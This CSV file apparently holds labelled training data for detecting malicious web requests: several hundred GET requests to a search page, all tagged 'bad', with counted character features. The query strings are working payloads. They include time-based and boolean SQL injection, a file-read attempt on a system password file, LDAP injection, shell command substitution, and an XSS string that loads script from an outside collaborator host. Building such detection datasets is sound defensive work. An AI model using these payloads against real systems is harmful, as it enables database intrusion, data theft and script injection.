method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,"b""/search.jsp?query=/'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'""",b'',2,0,0,4,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/;',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/benchmark(10000000,MD5(1))#'",b'',0,0,0,2,0,1,bad
GET,"b""/search.jsp?query=/1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/';WAITFOR""",b'',1,0,0,0,0,1,bad
GET,"b""/search.jsp?query=/'))""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/;waitfor',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=/);waitfor',b'',0,0,0,0,0,1,bad
GET,"b""/search.jsp?query=/';waitfor""",b'',1,0,0,0,0,1,bad
GET,"b'/search.jsp?query=/"";waitfor'",b'',0,1,0,0,0,1,bad
GET,"b""/search.jsp?query=/');waitfor""",b'',1,0,0,0,0,1,bad
GET,"b'/search.jsp?query=/"");waitfor'",b'',0,1,0,0,0,1,bad
GET,b'/search.jsp?query=/));waitfor',b'',0,0,0,0,0,1,bad
GET,"b'/search.jsp?query=/"";waitfor'",b'',0,1,0,0,0,1,bad
GET,b'/search.jsp?query=/1)',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/||(elt(-3+5,bin(15),ord(10),hex(char(45))))'",b'',0,0,0,6,1,0,bad
GET,"b'/search.jsp?query=/""hi"""")'",b'',0,3,0,0,0,0,bad
GET,"b'/search.jsp?query=/""'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=/pg_sleep(__TIME__)--',b'',0,0,1,1,0,1,bad
GET,b'/search.jsp?query=/*(|(objectclass=*))',b'',0,0,0,2,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/insert',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=/1)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/*|',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/@var',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/1))',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/asc',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/(||6)',b'',0,0,0,1,0,0,bad
GET,"b'/search.jsp?query=/""a""""'",b'',0,3,0,0,0,0,bad
GET,"b'/search.jsp?query=/""'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=/#',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/hi',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/))',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/hi'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/0',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/21',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/limit',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/""))'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=/PRINT',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/hi')""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/));waitfor',b'',0,0,0,0,0,1,bad
GET,"b""/search.jsp?query=/a'""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/1;(load_file(char(47,101,116,99,47,112,97,115,'",b'',0,0,0,3,0,0,bad
GET,b'/search.jsp?query=/or%201=1',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=/1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/exec',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=/;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/3.10E+17',b'',0,0,0,0,1,0,bad
GET,"b'/search.jsp?query=/""'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=/x'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/&',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/admin'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=///',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/truncate',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/1)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/\\x27UNION',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/tz_offset',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/sqlvuln',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/""));waitfor'",b'',0,1,0,0,0,1,bad
GET,b'/search.jsp?query=/||6',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or%201=1',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=/%2A%28%7C%28objectclass%3D%2A%29%29',b'',0,0,0,2,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/PRINT',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/26',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/""'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=/(sqlvuln)',b'',0,0,0,1,0,0,bad
GET,"b""/search.jsp?query=/x'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/0x770061006900740066006F0072002000640065006C00',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/%20'sleep%2050'""",b'',2,0,0,0,2,1,bad
GET,b'/search.jsp?query=/as',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/1))',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=//**/or/**/1/**/=/**/1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/,@variable'",b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/(sqlattempt2)',b'',0,0,0,1,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/t'exec""",b'',1,0,0,0,0,1,bad
GET,b'/search.jsp?query=/%20$(sleep%2050)',b'',0,0,0,1,2,1,bad
GET,b'/search.jsp?query=/1',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/%20or%20''='""",b'',3,0,0,0,2,0,bad
GET,b'/search.jsp?query=/||UTL_HTTP.REQUEST',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/hi'""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/"")'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/0x77616974666F722064656C61792027303A303A313027',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/exec(@s)',b'',0,0,0,1,0,1,bad
GET,b'/search.jsp?query=/)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/a'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/a'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/|',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/having',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/a'""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/""'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/\xe2\x80\x98',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/char%4039%41%2b%40SELECT',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=/order',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/bfilename',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/;waitfor',b'',0,0,0,0,0,1,bad
GET,"b'/search.jsp?query=/""'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=/x'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/*/*',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/"");waitfor'",b'',0,1,0,0,0,1,bad
GET,"b""/search.jsp?query=/a'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/%20or%20x=x',b'',0,0,0,0,2,0,bad
GET,b'/search.jsp?query=/select',b'',0,0,0,0,0,1,bad
GET,"b'/search.jsp?query=/""))'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=/0x730065006c0065006300740020004000400076006500',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/hi'""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/"")'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=/%20or%20'x'='x""",b'',3,0,0,0,2,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/exec',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=/29',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/(',b'',0,0,0,1,0,0,bad
GET,b'/search.jsp?query=/\xc3\xbd',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/0',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/uni/**/on',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/replace',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/%27%20or%201=1',b'',1,0,0,0,2,0,bad
GET,b'/search.jsp?query=/))',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/%7C',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/x'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/&apos;%20OR',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=/;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/23',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/anything'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/desc',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/||'6""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/)',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/1))',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/hi',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/*(|(mail=*))',b'',0,0,0,2,0,0,bad
GET,b'/search.jsp?query=/password:*/=1--',b'',0,0,1,0,0,0,bad
GET,b'/search.jsp?query=/distinct',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/);waitfor',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=/to_timestamp_tz',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/"")'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/%2A%28%7C%28mail%3D%2A%29%29',b'',0,0,0,2,0,0,bad
GET,b'/search.jsp?query=/+sqlvuln',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/))',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/sqlvuln;',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/x'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/28',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/\xe2\x80\x98',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/@variable',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/""a""""'",b'',0,3,0,0,0,0,bad
GET,b'/search.jsp?query=///*',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/%2A%7C',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/""'",b'',0,1,0,0,0,0,bad
GET,"b'/search.jsp?query=/""))'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=/?',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/!',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/declare',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/\x18',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/x'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'%20or%20''='""",b'',4,0,0,0,2,0,bad
GET,"b""/search.jsp?query=/'%20or%20'x'='x""",b'',4,0,0,0,2,0,bad
GET,"b""/search.jsp?query=/')%20or%20('x'='x""",b'',4,0,0,1,2,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/')""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'hi'""",b'',2,0,0,0,0,0,bad
GET,b'/search.jsp?query=/or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/procedure',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/handler',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/';""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/t'exec""",b'',1,0,0,0,0,1,bad
GET,b'/search.jsp?query=/--sp_password',b'',0,0,1,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'||UTL_HTTP.REQUEST""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/1;SELECT%20*',b'',0,0,0,0,1,1,bad
GET,"b'/search.jsp?query=/<>""\'%;)(&+'",b'',1,1,0,1,1,0,bad
GET,"b""/search.jsp?query=/'%20or%201=1""",b'',1,0,0,0,2,0,bad
GET,"b""/search.jsp?query=/'sqlattempt1""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/%28',b'',0,0,0,1,0,0,bad
GET,b'/search.jsp?query=/%29',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/%26',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=/%21',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/'""",b'',1,0,0,0,0,0,bad
GET,b'/search.jsp?query=/\x18',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/""><script'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=/0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,b'/search.jsp?query=/;',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/</script><svg/onload=\'+/""/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/xxx.burpcollaborator.net/).slice(2),document.documentElement.appendChild(s))//\'>'",b'',2,1,0,6,4,0,bad
GET,b'/search.jsp?query=/%3C%22img',b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=x/admin'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=x/-6513%27%20OR%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL--%20SpSw',b'',1,0,1,2,8,1,bad
GET,"b""/search.jsp?query=x/admin%20waitfor%20delay%20'0:0:15'%20--%20""",b'',2,0,1,0,5,2,bad
GET,b'/search.jsp?query=x/admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20',b'',0,0,1,0,4,0,bad
GET,b'/search.jsp?query=x/admin%20OR%202%2B669-669-1=0%2B0%2B0%2B1',b'',0,0,0,0,2,0,bad
GET,"b'/search.jsp?query=x/admin""%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20'",b'',0,1,1,0,4,0,bad
GET,"b""/search.jsp?query=x/'xor(if(now()=sysdate(),sleep(30),0))or""",b'',1,0,0,5,0,1,bad
GET,"b""/search.jsp?query=x/admin@admin.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,"b'/search.jsp?query=x/orwa(select(0)from(select(sleep(15)))v)/*\'%2B(select(0)from(select(sleep(15)))v)%2B\'""%2B(select(0)from(select(sleep(15)))v)%2B""*/'",b'',2,2,0,15,0,9,bad
GET,b'/search.jsp?query=x/if(now()=sysdate()%2Csleep(15)%2C0)',b'',0,0,0,4,0,1,bad
GET,"b""/search.jsp?query=x/admin';%20waitfor%20delay%20'0:0:15'%20--%20""",b'',3,0,1,0,5,2,bad
GET,"b""/search.jsp?query=x/admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,"b""/search.jsp?query=x/admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=x/1%00%C0%A7%C0%A2%252527%252522',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=x/admin'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,"b'/search.jsp?query=x/(select(0)from(select(sleep(15)))v)/*\'%2B(select(0)from(select(sleep(15)))v)%2B\'""%2B(select(0)from(select(sleep(15)))v)%2B""*/'",b'',2,2,0,15,0,9,bad
GET,b'/search.jsp?query=x/gGBw={vsCx}&firc=<',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=x/orwa';%20waitfor%20delay%20'0:0:15'%20--%20""",b'',3,0,1,0,5,2,bad
GET,b'/search.jsp?query=x/c4aQYcql',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=x/1%20waitfor%20delay%20'0:0:15'%20--%20""",b'',2,0,1,0,5,2,bad
GET,"b'/search.jsp?query=x/0%27XOR(if(now()=sysdate(),sleep(11),0))XOR%27Z'",b'',2,0,0,5,0,1,bad
GET,"b""/search.jsp?query=x/orwa'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,"b'/search.jsp?query=x/orwa""XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR""Z'",b'',0,2,0,5,0,1,bad
GET,"b'/search.jsp?query=x/orwa-1""%20OR%202%2B804-804-1=0%2B0%2B0%2B1%20--%20'",b'',0,1,1,0,4,0,bad
GET,b'/search.jsp?query=x/%40%40KFdwo',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=x/u]H[ww6KrA9F.x-F'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,"b""/search.jsp?query=x/orwa@orwa.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,b'/search.jsp?query=x/orwa%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20',b'',0,0,1,0,4,0,bad
GET,"b""/search.jsp?query=x/admin');%20waitfor%20delay%20'0:0:9'""",b'',3,0,0,0,3,2,bad
GET,"b""/search.jsp?query=x/'xor(if(mid(database(),1,1)=0x41,sleep(30),0))or""",b'',1,0,0,5,0,1,bad
GET,"b""/search.jsp?query=x/orwa')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,"b""/search.jsp?query=x/orwa'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=x/1%20AND%20(SELECT%208603%20FROM%20(SELECT(SLEEP(10)))xMdQ)',b'',0,0,0,4,5,3,bad
GET,"b""/search.jsp?query=x/xx49236287'%20or%208896=8896--""",b'',1,0,1,0,2,0,bad
GET,"b'/search.jsp?query=x/1)%20OR%20ELT(2023=2023,SLEEP(5))#'",b'',0,0,0,2,2,1,bad
GET,"b""/search.jsp?query=x/orwa'%20OR%201=1--""",b'',1,0,1,0,2,0,bad
GET,b'/search.jsp?query=x/(SELECT%20(CASE%20WHEN%20(9967=9967)%20THEN%2010%20ELSE%20(SELECT%204619%20UNION%20SELECT%207284)%20END))',b'',0,0,0,4,12,4,bad
GET,"b'/search.jsp?query=x/10%20AND%20(SELECT%201030%20FROM(SELECT%20COUNT(*),CONCAT(0x7176717071,(SELECT%20(ELT(1030=1030,1))),0x7176717871,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)'",b'',0,0,0,9,11,4,bad
GET,b'/search.jsp?query=x/10%20AND%20(SELECT%204814%20FROM%20(SELECT(SLEEP(5)))jQqq)',b'',0,0,0,4,5,3,bad
GET,b'/search.jsp?query=x/10%20UNION%20ALL%20SELECT',b'',0,0,0,0,3,2,bad
GET,b'/search.jsp?query=x/+or+sleep(0.2)%23)',b'',0,0,0,1,2,1,bad
GET,"b""/search.jsp?query=x/-1;%20waitfor%20delay%20'0:0:10'%20--%20""",b'',2,0,1,0,5,2,bad
